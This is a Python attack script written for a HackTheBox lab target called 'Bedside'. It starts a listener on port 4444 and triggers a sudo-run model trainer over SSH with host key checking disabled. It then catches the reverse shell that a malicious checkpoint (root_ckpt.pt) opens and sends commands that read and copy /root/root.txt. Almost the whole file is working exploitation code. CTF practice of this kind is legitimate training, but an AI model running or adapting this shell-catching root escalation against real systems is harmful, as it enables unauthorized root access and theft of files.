#!/usr/bin/env python3
"""
Catches reverse shell from root_ckpt.pt running on bedside target.
1. Starts TCP listener on Kali
2. Runs sudo trainer on target via SSH
3. Catches reverse shell, sends commands, captures flag
"""
import socket, subprocess, time, threading, os, sys

KALI_PORT = 4444
TARGET = "bedside.htb"
SSH_KEY = os.path.expanduser("~/.ssh/id_rsa")
FLAG_FILE = "/home/kali/Documents/HTB LAB/Bedside/root_flag.txt"
TIMEOUT = 60

results = []

def listener_thread():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.settimeout(TIMEOUT)
    srv.bind(('0.0.0.0', KALI_PORT))
    srv.listen(1)
    print(f'[*] Listening on 0.0.0.0:{KALI_PORT} for reverse shell...')
    try:
        conn, addr = srv.accept()
        print(f'[*] Got connection from {addr}!')
        time.sleep(1)
        
        # Read initial output
        conn.settimeout(5)
        try:
            init = conn.recv(4096)
            results.append(f"INIT: {init.decode(errors='replace')}")
        except:
            pass
        
        # Send commands
        commands = [
            "id",
            "whoami",
            "cat /root/root.txt",
            f"cp /root/root.txt {FLAG_FILE} 2>/dev/null; echo done > /tmp/flag_copied",
        ]
        for cmd in commands:
            conn.send((cmd + "\n").encode())
            time.sleep(1)
            try:
                conn.settimeout(3)
                resp = conn.recv(8192).decode(errors='replace')
                results.append(f"CMD[{cmd}]: {resp}")
            except socket.timeout:
                results.append(f"CMD[{cmd}]: (no response)")
        
        # Keep connection open briefly for cp to finish
        time.sleep(1)
        conn.close()
    except socket.timeout:
        results.append("TIMEOUT: No connection received")
    except Exception as e:
        results.append(f"ERROR: {e}")
    finally:
        srv.close()

# Start listener
t = threading.Thread(target=listener_thread, daemon=True)
t.start()
time.sleep(2)

# Run trainer on target
print('[*] Running sudo trainer on target...')
try:
    proc = subprocess.run(
        ['ssh', '-i', SSH_KEY, '-o', 'StrictHostKeyChecking=no', 
         f'developer@{TARGET}',
         'sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py 2>&1'],
        capture_output=True, text=True, timeout=TIMEOUT-10
    )
    results.append(f"TRAINER_STDOUT: {proc.stdout[-300:] if proc.stdout else 'none'}")
    results.append(f"TRAINER_STDERR: {proc.stderr[-300:] if proc.stderr else 'none'}")
except subprocess.TimeoutExpired:
    results.append("SSH/TIMEOUT")
except Exception as e:
    results.append(f"SSH ERROR: {e}")

# Wait for listener to finish
t.join(timeout=15)

# Save results
with open("/tmp/root_catcher_results.txt", "w") as f:
    f.write("=== ROOT FLAG CATCHER RESULTS ===\n\n")
    for r in results:
        f.write(r + "\n\n")
    # Check if flag was captured directly
    if os.path.exists(FLAG_FILE):
        with open(FLAG_FILE) as ff:
            f.write(f"\n=== FLAG FILE ===\n{ff.read()}\n")

print("\n=== RESULTS ===")
for r in results:
    print(r)
    print()
